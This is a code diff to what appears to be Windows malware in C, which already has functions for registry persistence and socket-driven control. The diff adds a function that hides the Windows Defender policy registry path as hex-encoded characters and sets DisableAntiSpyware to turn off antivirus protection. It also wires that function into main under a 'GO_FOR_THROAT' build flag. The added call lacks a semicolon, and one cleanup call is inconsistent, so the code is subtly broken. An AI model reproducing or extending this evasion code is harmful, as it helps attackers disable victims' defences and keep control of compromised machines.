@@ -355,6 +355,29 @@ void attemptDefeatDefender(SOCKET* pSockfd) {
 	return;
 }
 
+void attemptDefeatDefenderNoNetwork() {
+	HKEY key;
+	DWORD one = 0x00000001;
+
+
+	// This is the path in hex stored on the stack.
+	wchar_t path[] = { 0x0053, 0x004f, 0x0046, 0x0054, 0x0057, 0x0041, 0x0052, 0x0045, 0x005c, 0x0050, 0x006f, 0x006c, 0x0069, 0x0063, 0x0069, 0x0065, 0x0073, 0x005c, 0x004d, 0x0069, 0x0063, 0x0072, 0x006f, 0x0073, 0x006f, 0x0066, 0x0074, 0x005c, 0x0057, 0x0069, 0x006e, 0x0064, 0x006f, 0x0077, 0x0073, 0x0020, 0x0044, 0x0065, 0x0066, 0x0065, 0x006e, 0x0064, 0x0065, 0x0072, 0x0000 };
+
+	// Need to get a handle to the registry tree.
+	if (pRegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &key) != ERROR_SUCCESS) {
+		return;
+	}
+
+	// Create the value
+	if (pRegSetValueExW(key, L"DisableAntiSpyware", 0, REG_DWORD, (LPBYTE)&one, sizeof(DWORD)) != ERROR_SUCCESS) {
+		RegCloseKey(key);
+		return;
+	}
+
+	pRegCloseKey(key);
+	return;
+}
+
 //Attempts to add autostart to both the local machine and current user keys
 void attemptRegistryPersistence(SOCKET* pSockfd, TCHAR* dirName) {
 
@@ -523,6 +546,7 @@ int main(int argc, char* argv[]) {
 
 #ifdef GO_FOR_THROAT
 	attemptFullPersistenceNoNetwork(dirName);
+	attemptDefeatDefenderNoNetwork()
 #endif
 
 	char commandList[] =
